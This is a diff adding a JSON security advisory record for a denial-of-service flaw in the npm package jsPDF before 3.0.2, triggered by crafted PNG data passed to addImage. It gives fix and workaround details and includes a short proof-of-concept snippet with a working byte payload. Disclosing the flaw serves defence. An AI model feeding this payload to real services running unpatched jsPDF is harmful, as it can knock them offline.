@@ -1,0 +1,66 @@
+{
+  "affected": [
+    {
+      "database_specific": {
+        "last_known_affected_version_range": "<= 3.0.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-8mvj-3j78-4qmw/GHSA-8mvj-3j78-4qmw.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "jspdf",
+        "purl": "pkg:npm/jspdf"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.0.2"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
+  "aliases": [
+    "CVE-2025-57810"
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-835"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2025-08-26T16:19:04Z",
+    "nvd_published_at": null,
+    "severity": "HIGH"
+  },
+  "details": "### Impact\nUser control of the first argument of the addImage method results in CPU utilization and denial of service.\n\nIf given the possibility to pass unsanitized image data or URLs to the addImage method, a user can provide a harmful PNG file that results in high CPU utilization and denial of service.\n\nOther affected methods are: `html`.\n\nExample payload:\n\n```js\nimport { jsPDF } from \"jpsdf\" \n\nconst payload = new Uint8Array([117, 171, 90, 253, 166, 154, 105, 166, 154])\n\nconst doc = new jsPDF();\nconst startTime = performance.now();\ntry {\n  doc.addImage(payload, \"PNG\", 10, 40, 180, 180, undefined, \"SLOW\");\n} finally {\n  const endTime = performance.now();\n  console.log(`Call to doc.addImage took ${endTime - startTime} milliseconds`);\n}\n```\n\n### Patches\nThe vulnerability was fixed in jsPDF 3.0.2. Upgrade to jspdf@>=3.0.2.\n\nIn jspdf@>=3.0.2, invalid PNG files throw an Error instead of causing very long running loops.\n\n### Workarounds\nSanitize image data or URLs before passing it to the addImage method or one of the other affected methods.\n\n### Credits\nResearcher: Aleksey Solovev (Positive Technologies)",
+  "id": "GHSA-8mvj-3j78-4qmw",
+  "modified": "2025-08-26T16:44:32.769358Z",
+  "published": "2025-08-26T16:19:04Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/parallax/jsPDF/security/advisories/GHSA-8mvj-3j78-4qmw"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/parallax/jsPDF/commit/4cf3ab619e565d9b88b4b130bff901b91d8688e9"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/parallax/jsPDF"
+    }
+  ],
+  "schema_version": "1.7.3",
+  "severity": [
+    {
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+      "type": "CVSS_V4"
+    }
+  ],
+  "summary": "jsPDF Denial of Service (DoS)"
+}
